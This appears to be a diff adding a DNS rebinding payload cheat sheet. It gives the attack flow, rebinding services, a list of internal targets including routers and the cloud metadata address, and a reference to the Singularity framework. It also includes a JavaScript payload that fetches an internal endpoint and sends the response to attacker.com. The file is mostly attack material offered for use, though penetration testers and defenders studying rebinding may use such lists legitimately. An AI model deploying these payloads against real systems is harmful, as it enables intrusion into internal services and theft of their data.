@@ -1,0 +1,56 @@
+# ============================================================
+# DNS Rebinding — Payloads & Techniques
+# ============================================================
+
+# ---- Attack Flow ----
+# 1. Victim visits attacker's page (e.g., evil.com)
+# 2. evil.com DNS TTL expires rapidly (TTL=0)
+# 3. Next DNS lookup returns internal IP (127.0.0.1, 192.168.x.x)
+# 4. Browser same-origin policy now allows requests to internal services
+
+# ---- DNS Rebinding Services (for testing) ----
+# rbndr.us: 1.1.1.1.127.0.0.1.rbndr.us → alternates between IPs
+# nip.io: 127.0.0.1.nip.io → always resolves to 127.0.0.1
+# sslip.io: 127.0.0.1.sslip.io
+# localtest.me: always → 127.0.0.1
+
+# ---- Internal IP Targets ----
+127.0.0.1
+localhost
+0.0.0.0
+169.254.169.254
+192.168.0.1
+192.168.1.1
+10.0.0.1
+172.16.0.1
+[::1]
+
+# ---- Rebinding JavaScript Payload ----
+<script>
+// Phase 1: load from evil.com
+fetch('/api/secret')  // first request: evil.com
+  .then(r => r.text())
+  .then(data => {
+    // Phase 2: rebind DNS to 127.0.0.1
+    fetch('/api/internal-endpoint')  // now hits localhost
+      .then(r => r.text())
+      .then(d => fetch('https://attacker.com/?d=' + encodeURIComponent(d)));
+  });
+</script>
+
+# ---- Rebinding Attack on Local Services ----
+# Target: http://localhost:8080 (admin panel, development server)
+# Target: http://192.168.1.1 (router admin)
+# Target: http://169.254.169.254 (cloud metadata)
+
+# ---- Singularity (DNS Rebinding Framework) ----
+# https://github.com/nccgroup/singularity
+# Manager: http://rebind.it:8080/manager
+# Payload: http://rebind.it:8080/attack (embeds target)
+
+# ---- Time-Based Rebinding ----
+# DNS TTL=1s → wait 1s → rebind
+# JavaScript: setTimeout(doRebind, 1100)
+
+# ---- NAT Slipstreaming (related) ----
+# Uses rebinding + special port to bypass NAT firewall
